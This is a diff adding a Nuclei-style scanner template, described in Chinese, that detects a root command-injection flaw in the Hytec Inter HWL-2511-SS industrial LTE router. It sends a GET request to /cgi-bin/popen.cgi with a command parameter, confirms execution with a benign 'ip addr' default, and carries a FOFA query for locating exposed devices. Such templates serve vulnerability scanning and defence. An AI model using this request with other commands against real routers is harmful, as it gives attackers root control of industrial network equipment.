@@ -1,0 +1,33 @@
+id: hytec_2511_ss_rce
+info:
+  name: HWL-2511-SSpopen.cgi命令执行漏洞
+  author: Xc1Ym
+  severity: critical
+  description: Hytec Inter HWL-2511-SS 是日本Hytec Inter公司的一种工业 LTE 路由器和 Wi-Fi 接入点。Hytec Inter HWL-2511-SS v1.05 及之前存在安全漏洞，该漏洞源于 CLI 允许攻击者以 root 权限执行任意命令。
+  metadata:
+    max-request: 1
+    fofa-query: body="app/feature/portForwarding.js" || body="app/app.translate-config.js"
+    verified: true
+  tags: rce,network,abroad,others
+
+variables:
+  cmd: "ip%20addr"
+
+http:
+    - method: GET
+      path: 
+        - "{{RootURL}}/cgi-bin/popen.cgi?command={{cmd}}"
+      matchers-condition: and
+      matchers:
+        - type: word
+          part: body
+          words:
+            - lo
+            - eth0
+            - "LOOPBACK,UP,LOWER_UP"
+          condition: and
+        - type: word
+          part: header
+          words:
+            - "Server: lighttpd/1.4.30"
+# digest: 4b0a00483046022100c443629fa8f1d8b10c10afd64eb9bdf9e7149ce025bb36d2e556dfdd7a62d764022100a635ceb941bf01b9547a01e7bec9b5e82638e36cfaeb25baff1a0655c64b66cb:6b2dd5af372f02ed15a56faf8ad98cf9
